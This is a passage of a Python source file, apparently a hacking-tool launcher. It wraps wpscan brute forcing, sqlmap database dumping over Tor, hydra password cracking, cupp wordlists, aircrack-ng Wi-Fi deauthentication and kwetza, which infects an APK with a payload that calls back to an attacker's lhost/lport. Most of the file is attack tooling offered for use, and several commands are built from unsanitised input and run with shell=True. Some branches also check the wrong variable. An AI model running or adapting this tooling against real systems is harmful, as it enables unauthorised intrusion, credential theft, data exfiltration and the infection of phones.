                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("url          yes        ", url)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "url" in module:
                            url = module.replace("url", "")
                            print("url ==>", url)
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "wpscan --url " + url
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: scan")
                        break
            if module == "username":
                print("You have chosen the module: username")
                url = ""
                while True:
                    command1 = str(input("#wpscan/username>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            Start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("url          yes        ", url)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "url" in module:
                            url = module.replace("url", "")
                            print("url ==>", url)
                    if command1.startswith("execute") or command.endswith("execute"):
                        shell1 = "wpscan --url " + url + " --enumerate u"
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: username")
                        break
            if module == "bruteforce":
                print("You have chosen the module: bruteforce")
                url = ""
                wordlist = ""
                username = ""
                threads = ""
                while True:
                    command1 = str(input("#wpscan/bruteforce>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("url          yes        ", url)
                        print("wordlist     yes        ", wordlist)
                        print("username     yes        ", username)
                        print("threads      yes        ", threads)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "url" in module:
                            url = module.replace("url", "")
                            print("url ==>", url)
                        if "wordlist" in module:
                            wordlist = module.replace("wordlist", "")
                            print("wordlist ==>", wordlist)
                        if "username" in module:
                            username = module.replace("username", "")
                            print("username ==>", username)
                        if "threads" in module:
                            threads = module.replace("threads", "")
                            print("threads ==>", threads)
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "wpscan --url " + url + " --wordlist " + wordlist + " --username " + username + " --threads " + threads
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: bruteforce")
                        break
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: wpscan")
            break

def httrack():
    print("You have chosen the module: httrack")
    website = ""
    directory = ""
    verbose = False
    vverbose = "no"
    while True:
        command = str(input("#httrack>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This tool can copy a website in a your computer directory")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTIONS      REQUIRED    CURRENT VALUE")
            print("website      yes        ", website)
            print("directory    no         ", directory)
            print("verbose      no         ", vverbose)
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "website" in module:
                website = module.replace("website", "")
                print("website ==>", website)
            if "directory" in module:
                directory = module.replace("directory", "")
                print("directory ==>", directory)
            if "verbose" in module:
                vverbose = module.replace("verbose", "")
                if vverbose == "yes" or vverbose == "no":
                    print("verbose ==>", vverbose)
                    if vverbose == "yes":
                        verbose = True
                    else:
                        verbose = False
                else:
                    print("The option verbose can be only yes or no")
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "httrack " + website + " "
            if directory != "":
                shell1 += directory
            if verbose == True:
                shell1 += " -v"
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: httrack")
            break

def sqlmap():
    print("You have chosen the module: sqlmap")
    while True:
        command = str(input("#sqlmap>>>"))
        if command.startswith("help") or command.endswith("help"):
            print()
            print("This tool detect and exploit sql vulnerabilities.")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow modules       Show the modules")
            print("\tuse <MODULE>       Use a module")
            print("\tback               Go back to the main menu")
        if command.startswith("show modules") or command.endswith("show modules"):
            print("MODULE       DESCRIPTION")
            print("check        Check for sql vulnerabilities")
            print("database     Show all sql database")
            print("table        Show all table of a given sql database")
            print("dump         Dump the value from a given table")
        if "use" in command:
            module1 = command.replace("use", "")
            module = module1.replace(" ", "")
            if module == "check":
                print("You have chosen the module: check")
                url = ""
                ttor = "no"
                tor = False
                while True:
                    command1 = str(input("#sqlmap/check>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("url          yes        ", url)
                        print("tor          no         ", ttor)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "url" in module:
                            url = module.replace("url", "")
                            print("url ==>", url)
                        if "tor" in module:
                            ttor = module.replace("tor", "")
                            if ttor == "yes" or ttor == "no":
                                print("tor ==>", ttor)
                                if ttor == "yes":
                                    tor = True
                                else:
                                    tor = False
                            else:
                                print("The option tor can be only yes or no")
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "sqlmap "
                        if tor == True:
                            shell1 += "--tor --tor-type=SOCKS5 -u " + url
                        else:
                            shell1 += "-u " + url
                        try:
                            if tor == True:
                                print("[+] Running command: service tor start")
                                subprocess.run("service tor start", shell=True)
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: check")
                        break
            if module == "database":
                print("You have chosen the module: database")
                url = ""
                ttor = "no"
                tor = False
                while True:
                    command1 = str(input("#sqlmap/database>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("url          yes        ", url)
                        print("tor          no         ", ttor)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "url" in module:
                            url = module.replace("url", "")
                            print("url ==>", url)
                        if "tor" in module:
                            ttor = module.replace("tor", "")
                            if ttor == "yes" or ttor == "no":
                                print("tor ==>", ttor)
                                if ttor == "yes":
                                    tor = True
                                else:
                                    tor = False
                            else:
                                print("The option tor can be only yes or no")
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "sqlmap "
                        if tor == True:
                            shell1 += "--tor --tor-type=SOCKS5 -u " + url + " --dbs"
                        else:
                            shell1 += "-u " + url + " --dbs"
                        try:
                            if tor == True:
                                print("[+] Running command: service tor start")
                                subprocess.run("service tor start", shell=True)
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: database")
                        break
            if module == "table":
                print("You have chosen the module: table")
                url = ""
                database = ""
                ttor = "no"
                tor = False
                while True:
                    command1 = str(input("#sqlmap/table>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("url          yes        ", url)
                        print("database     yes        ", database)
                        print("tor          no         ", ttor)
                    if "set" in command1:
                        module = command1.replace("set ", "")
                        if "url" in module:
                            url = module.replace("url", "")
                            print("url ==>", url)
                        if "database" in module:
                            database = module.replace("database", "")
                            print("database ==>", database)
                        if "tor" in module:
                            ttor = module.replace("tor", "")
                            if ttor == "yes" or ttor == "no":
                                print("tor ==>", ttor)
                                if ttor == "yes":
                                    tor = True
                                else:
                                    tor = False
                            else:
                                print("The option tor can be only yes or no")
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "sqlmap "
                        if tor == True:
                            shell1 += "--tor --tor-type=SOCKS5 -u " + url + " -o --dbms MySql -D " + database + " --tables"
                        else:
                            shell1 += "-u " + url + " -o --dbms MySql -D " + database + " --tables"
                        try:
                            if tor == True:
                                print("[+] Running command: service tor start")
                                subprocess.run("service tor start", shell=True)
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: table")
                        break
            if module == "dump":
                print("You have chosen the module: dump")
                url = ""
                database = ""
                table = ""
                ttor = "no"
                tor = False
                while True:
                    command1 = str(input("#sqlmap/dump>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("url          yes        ", url)
                        print("database     yes        ", database)
                        print("table        yes        ", table)
                        print("tor          no         ", ttor)
                    if "set" in command1:
                        module = command1.replace("set ", "")
                        if "url" in module:
                            url = module.replace("url", "")
                            print("url ==>", url)
                        if "database" in module:
                            database = module.replace("database", "")
                            print("database ==>", database)
                        if "table" in module:
                            table = module.replace("table", "")
                            print("table ==>", table)
                        if "tor" in module:
                            ttor = module.replace("tor", "")
                            if ttor == "yes" or ttor == "no":
                                print("tor ==>", ttor)
                                if ttor == "yes":
                                    tor = True
                                else:
                                    tor = False
                            else:
                                print("The option tor can be only yes or no")
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "sqlmap "
                        if tor == True:
                            shell1 += "--tor --tor-type=SOCKS5 -u " + url + " -o --dbms MySql -D " + database + " -T " + table + "--columns --dump"
                        else:
                            shell1 += "-u " + url + " -o --dbms MySql -D " + database + " -T " + table + " --columns --dump"
                        try:
                            if tor == True:
                                print("[+] Running command: service tor start")
                                subprocess.run("service tor start", shell=True)
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: dump")
                        break
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: sqlmap")
            break

def kwetza():
    print("You have chosen the module: kwetza")
    main = os.getcwd()
    os.chdir("tools")
    os.chdir("kwetza")
    apk = ""
    lhost = ""
    lport = ""
    mode = "https"
    add = True
    vadd = "yes"
    while True:
        command = str(input("#kwetza>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("Infect an existing apk and exploit a phone")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTIONS      REQUIRED    CURRENT VALUE")
            print("apk-path     yes        ", apk)
            print("lhost        yes        ", lhost)
            print("lport        yes        ", lport)
            print("mode         no         ", mode)
            print("add-evil     no         ", vadd)
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "apk-path" in module:
                apk = module.replace("apk-path", "")
                print("apk-path ==>", apk)
            if "lhost" in module:
                lhost = module.replace("lhost", "")
                print("lhost ==>", lhost)
            if "lport" in module:
                lport = module.replace("lport", "")
                print("lport ==>", lport)
            if "mode" in module:
                mode = module.replace("mode", "")
                if mode == "https" or mode == "tcp":
                    print("mode ==>", mode)
                else:
                    print("The option mode can be only https or tcp")
                    mode = "https"
            if "add" in module:
                vadd = module.replace("verbose", "")
                if vadd == "yes" or vadd == "no":
                    print("add ==>", vadd)
                    if vadd == "yes":
                        add = True
                    else:
                        add = False
                else:
                    print("The option add can be only yes or no")
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "python kwetza.py " + apk + " " + mode + " " + lhost + " " + lport + " " + vadd 
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: kwetza")
            break

def hydra():
    print("You have chosen the module: hydra")
    protocol = ""
    host = ""
    login = ""
    password = ""
    protocol = ""
    verbose = False
    vverbose = "no"
    while True:
        command = str(input("#hydra>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("One of the best tool for password cracking")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTIONS      REQUIRED    CURRENT VALUE")
            print("host         yes        ", host)
            print("login        yes        ", login, "(must be a file)")
            print("password     yes        ", password, "(must be a file)")
            print("protocol     yes        ", protocol, "(ftp, smb, pop3, imap, mysql, vnc, ssh and telnet)")
            print("verbose      no         ", vverbose)
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "host" in module:
                host = module.replace("host", "")
                print("host ==>", host)
            if "login" in module:
                login = module.replace("login", "")
                print("login ==>", login)
            if "password" in module:
                password = module.replace("password", "")
                print("password ==>", password)
            if "protocol" in module:
                protocol = module.replace("protocol", "")
                if protocol == "ftp" or protocol == "smb" or protocol == "pop3" or protocol == "imap" or protocol == "mysql" or protocol == "vnc" or protocol == "ssh" or protocol == "telnet":
                    print("protocol ==>", protocol)
                else:
                    protocol = ""
                    print("Invalid protocol!")
            if "verbose" in module:
                vverbose = module.replace("verbose", "")
                if vverbose == "yes" or vverbose == "no":
                    print("verbose ==>", vverbose)
                    if vverbose == "yes":
                        verbose = True
                    else:
                        verbose = False
                else:
                    print("The option verbose can be only yes or no")
        if command.startswith("execute") or command.endswith("execute"):
            if verbose == True:
                shell1 = "hydra -v -L " + login + " -P " + password + " " + protocol + "://" + host
            else:
                shell1 = "hydra -L " + login + " -P " + password + " " + protocol + "://" + host
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: hydra")
            break

def cupp():
    print("You have chosen the module: cupp")
    main = os.getcwd()
    os.chdir("tools")
    os.chdir("cupp")
    while True:
        command = str(input("#cupp>>>"))
        if command.startswith("help") or command.endswith("help"):
            print()
            print("Common User Password Profiler.")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow modules       Show the modules")
            print("\tuse <MODULE>       Use a module")
            print("\tback               Go back to the main menu")
        if command.startswith("show modules") or command.endswith("show modules"):
            print("MODULE       DESCRIPTION")
            print("default      download default usernames and password")
            print("interactive  Generate password from name, surname, ecc...")
        if "use" in command:
            module1 = command.replace("use", "")
            module = module1.replace(" ", "")
            if module == "default":
                print("You have chosen the module: default")
                while True:
                    command1 = str(input("#cupp/default>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\texecute            start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "python3 cupp.py -a"
                        try:
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                        print("[+] The file are called: alectodb-passwords.txt, alectodb-usernames.txt and alectodb.csv.gz")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: default")
                        break
            if module == "interactive":
                print("You have chosen the module: interactive")
                url = ""
                password = ""
                while True:
                    command1 = str(input("#cupp/interactive>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\texecute            Start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print()
                    if command1.startswith("execute") or command.endswith("execute"):
                        shell1 = "python3 cupp.py -i"
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: interactive")
                        break
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: cupp")
            os.chdir(main)
            break

def aircrack_ng():
    print("You have chosen the module: aircrack-ng")
    while True:
        command = str(input("#aircrack-ng>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module make a deauth attack")
            print("Before you use this module you have to run, in another terminal, \"airmon-ng start wlan0\" and then \"airodump-ng wlan0\"")
            print("when you see your victim hit Ctrl-C and enter the command \"airmon-ng stop wlan0mon\". This allows you to get what you need")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow modules       Show the modules")
            print("\tuse <MODULE>       Use a module")
            print("\tback               Go back to the main menu")
        if command.startswith("show modules") or command.endswith("show modules"):
            print("MODULE       DESCRIPTION")
            print("scan         Scan for Acces Point")
            print("deauth       Make a deauthentication attack")
        if "use" in command:
            module1 = command.replace("use", "")
            module = module1.replace(" ", "")
            if "scan" in module:
                print("You have chosen the module: scan")
                interface = ""
                channel = ""
                while True:
                    command1 = str(input("#aircrack-ng/scan>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print("This module make a scan for Acces Point")
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\tstart              Start the module", "(press Ctr-C to stop)")
                        print("\tstop               Stop the module", "(stops the monitor mode)")
                        print("\tback               Go back to the main menu")
                    if command1.startswith("show options") or command.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("interface    yes        ", interface, "(not in monitor mode)")
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "interface" in module:
                            interface = module.replace("interface", "")
                            print("interface ==>", interface)
                    if command1.startswith("start") or command1.endswith("start"):
                        shell1 = "airmon-ng start " + interface
                        interface2 = interface + "mon"
                        shell2 = "airodump-ng " + interface2
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                            print("[+] Running command:", shell2)
                            subprocess.run(shell2, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("stop") or command1.endswith("stop"):
                        interface2 = interface + "mon"
                        shell1 = "airmon-ng stop " + interface2
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: deauth")
                        break
            if "deauth" in module:
                print("You have chosen the module: deauth")
                interface = ""
                bssid = ""
                mac = ""
                number = ""
                channel = ""
                while True:
                    command1 = str(input("#aircrack-ng/deauth>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print("This module make a deauth attack")
                        print("Before you use this module you have to run, in another terminal, the module scan, and then write start")
                        print("when you see your victim hit Ctrl-C, and then write stop. This allows you to get what you need")
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            Start the module")
                        print("\tback               Go back to the main menu")
                    if command1.startswith("show options") or command.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("interface    yes        ", interface, "(not in monitor mode)")
                        print("bssid        yes        ", bssid, "(in the column BSSID)")
                        print("mac          yes        ", mac, "(in the column STATION, on the same line as the target's bssid)")
                        print("number       yes        ", number)
                        print("channel      recommended", channel, "(in the column CH, on the same line as the target's bssid)")
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "interface" in module:
                            interface = module.replace("interface", "")
                            print("interface ==>", interface)
                        if "bssid" in module:
                            bssid = module.replace("bssid", "")
                            print("bssid ==>", bssid)
                        if "mac" in module:
                            mac = module.replace("mac", "")
                            print("mac ==>", mac)
                        if "number" in module:
                            number = module.replace("number", "")
                            print("number ==>", "")
                        if "channel" in module:
                            channel = module.replace("channel", "")
                            print("channel ==>", channel)
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "airmon-ng start " + interface + " " + channel
                        interface2 = interface + "mon"
                        shell2 = "aireplay-ng -0 " + number + " -a " + bssid + " -c " + mac + " " + interface2
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                            print("[+] Running command:", shell2)
                            subprocess.run(shell2, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: deauth")
                        break
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: aircrack-ng")
            break

welcome()
while True:
    command = str(input("#>>>"))
    if command.startswith("help") or command.endswith("help"):
        help()
    if command.startswith("list all") or command.endswith("list all"):
        list_all()
    if "use" in command:
        use()
    if command.startswith("ip") or command.endswith("ip"):
        ip()
    if command.startswith("update") or command.endswith("update"):
        update()
    if command.startswith("clear") or command.endswith("clear"):
        clear()
    if command.startswith("exit") or command.endswith("exit"):
        print("See you at the next hack ;-)")
        break